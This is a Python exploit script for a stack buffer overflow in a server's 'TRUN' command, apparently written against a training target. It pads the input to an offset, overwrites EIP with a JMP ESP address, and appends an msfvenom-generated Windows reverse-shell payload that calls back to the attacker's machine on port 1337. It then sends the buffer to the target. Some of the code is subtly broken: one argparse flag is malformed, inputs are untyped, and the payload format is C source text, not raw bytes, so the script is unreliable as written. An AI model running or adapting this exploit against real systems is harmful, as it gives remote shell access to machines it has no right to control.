#!/usr/bin/python3

import sys,socket,argparse,subprocess
from pwn import p32


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i','--IP',dest = 'ip', help = 'Enter target IP address')
    parser.add_argument('-p','--port',dest = 'port',help = 'Enter target port. Default set to 9999')
    parser.add_argument('-c','--cmd',dest = 'cmd',help = 'Enter the name of server command being exploited. Default set to: \'TRUN /.:/\'')
    parser.add_argument('-o','--offset', dest = 'offset',help='Perform a manual search for EIP after BOF. Use pattern-offset meatsploit tool to find this offset. Default set to 2003' )
    parser.add_argument('-lp','local port',dest = 'lp',help = 'Enter call back port of attacker machine. Default set to port: 1337')
    parser.set_defaults(cmd = 'TRUN /.:/')
    parser.set_defaults(port = 9999)
    parser.set_defaults(offset = 2003)
    parser.set_defaults(lp = 1337)
    options = parser.parse_args()
    return options


def get_payload(ip,port):
    pipecmd_pl = ('msfvenom -p windows/shell_reverse_tcp LHOST="{}" LPORT={} EXITFUNC=thread -f c -a x86 -b "\\x00"'.format(ip,port))
    print(f'{fc.y}Generating payload please wait...{fc.end}')
    return subprocess.check_output(pipecmd_pl,shell = True)

def get_ip():
    pipecmd_ip = "/sbin/ip route | awk '/src/ { printf $9 }'"
    ip = subprocess.check_output(pipecmd_ip,shell=True)
    ip_decoded = ip.decode('utf-8')
    return ip_decoded
#######################################################################COLOR####################################################################################  


class fc:
    rw = '\033[31;107m'
    r = '\033[38;5;196m'
    pink_violet = '\033[38;5;206;48;5;57m'
    end = '\033[0m'
    pink = '\033[38;5;206m'
    y = '\033[0;33;40m'
    purple = '\033[0;35m'
    white_green = '\033[37;42m'
    cyan = '\033[36m'
    g = '\033[38;5;154m'
    b = '\033[38;5;45m'


#############################################################################VAR#################################################################################


opt = get_args()
ip = get_ip()
overflow = opt.cmd + 'A' * opt.offset
overflow = overflow.encode()
padding   = b'\x90' * 30 
jmpesp = p32(0x625011af)
timeout = 5 # s.connect timeout
payload = get_payload(ip,opt.lp)
payload = payload.encode() if isinstance(payload, str) else payload
buffer = overflow + jmpesp + padding + payload


print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Exploiting target at {fc.end}{fc.g}{opt.ip}{fc.end} {fc.b}port {fc.g}{opt.port}{fc.end}')
try:
    print(f'{fc.b}Connecting to target...{fc.end}')
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((str(opt.ip), opt.port))
    print(f'{fc.b}Connected to target.{fc.end}')
    print(f'{fc.r}Sending payload: {str(len(buffer))} bytes.{fc.end}')
    s.send(buffer)
    print(f'{fc.r}Payload sent.{fc.end}')
    s.close()


except Exception as e:
        print(f'\tError: {fc.rw}{e}{fc.end}')
        sys.exit()


except KeyboardInterrupt:
        print('Abort')
        